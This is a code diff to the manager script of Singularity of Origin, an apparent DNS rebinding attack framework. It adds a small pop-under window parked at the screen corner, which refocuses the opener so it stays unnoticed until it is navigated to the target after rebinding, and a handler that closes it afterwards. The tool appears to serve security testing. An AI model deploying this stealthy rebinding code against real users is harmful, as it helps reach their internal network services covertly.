@@ -709,6 +709,14 @@ function ipToHexOrOriginal(input) {
                 }
             }
 
+            if (msg.data.status === 'closePopup') {
+                const placeholder = fm.frame(fid).getPopupWindow();
+                if (placeholder && !placeholder.closed) {
+                    console.log(`Closing popup '${fm.frame(fid).getPopupName()}' after DNS rebinding succeeded`);
+                    placeholder.close();
+                }
+            }
+
             if (msg.data.status === 'popupBlocked') {
                 console.log(`Popup blocked for ${msg.origin}. Allow popups for this site, or click the button shown in the attack frame, then restart the attack.`);
             }
@@ -773,14 +781,11 @@ function ipToHexOrOriginal(input) {
             let popupPlaceholder = null;
             if (UIAttackMethod === 'popup') {
                 popupName = `soo-popup-${Math.floor(Math.random() * 2 ** 32)}`;
-                const placeholder = window.open('about:blank', popupName, 'width=900,height=700');
+                const placeholder = window.open('about:blank', popupName, popupWindowFeatures());
                 popupPlaceholder = placeholder;
                 if (placeholder) {
-                    try {
-                        placeholder.document.title = 'Singularity popup attack';
-                        placeholder.document.body.innerHTML =
-                            '<p>Singularity popup attack window. Do not close: this window will be navigated to the target once DNS has rebound.</p>';
-                    } catch (e) { /* placeholder content is best-effort */ }
+                    decorateSingularityPopup(placeholder);
+                    sinkPopup(placeholder);
                     console.log(`Opened placeholder popup '${popupName}' for the popup attack.`);
                 } else {
                     console.log('Placeholder popup blocked (no user gesture?). The attack frame will ask for a click instead.');
@@ -814,6 +819,61 @@ function ipToHexOrOriginal(input) {
             }), parseInt(UiInterval) * 1000));
         }
     }
+}
+
+// Small window, parked in the bottom-right of the screen so it is out
+// of the way of the manager. Browsers may clamp the coordinates.
+function popupWindowFeatures() {
+    const width = 380;
+    const height = 230;
+    const left = Math.max(0, (window.screen.availWidth || 0) - width - 24);
+    const top = Math.max(0, (window.screen.availHeight || 0) - height - 48);
+    return `width=${width},height=${height},left=${left},top=${top},` +
+        'menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=no';
+}
+
+// Placeholder page in the same visual language as singularity.html
+// (Bootstrap 4 jumbotron), inlined so about:blank does not need the CDN.
+function decorateSingularityPopup(popup) {
+    const html = `<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<title>Singularity of Origin</title>
+<style>
+  html, body { margin: 0; height: 100%; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; color: #212529; background: #fff; }
+  .jumbotron { padding: 1.1rem 1.25rem; margin: 0; background-color: #e9ecef; }
+  h1 { font-size: 1.35rem; font-weight: 400; line-height: 1.2; margin: 0 0 .35rem; }
+  .lead { margin: 0; font-size: 1rem; font-weight: 300; }
+  .note { margin: 0; padding: .9rem 1.25rem; font-size: .875rem; color: #6c757d; }
+</style></head>
+<body>
+  <div class="jumbotron">
+    <h1>Singularity of Origin</h1>
+    <p class="lead">DNS rebinding in progress.</p>
+  </div>
+  <p class="note">This window loads the target once DNS has rebound. Leave it in the background and don’t close it.</p>
+  <script>try { window.blur(); if (window.opener && !window.opener.closed) window.opener.focus(); } catch (e) {}</script>
+</body></html>`;
+    try {
+        const doc = popup.document;
+        doc.open();
+        doc.write(html);
+        doc.close();
+    } catch (e) { /* placeholder content is best-effort */ }
+}
+
+// Pop-under: return focus to the Singularity window. Firefox honors this
+// from the click that opened the popup. Chrome often keeps the new window
+// focused anyway, so also blur from inside the popup document and retry
+// once the open has finished.
+function sinkPopup(popup) {
+    const refocus = () => {
+        try { if (popup && !popup.closed) popup.blur(); } catch (e) {}
+        try { window.top.focus(); } catch (e) {}
+        try { window.focus(); } catch (e) {}
+    };
+    refocus();
+    setTimeout(refocus, 0);
 }
 
 function isUnixy() {
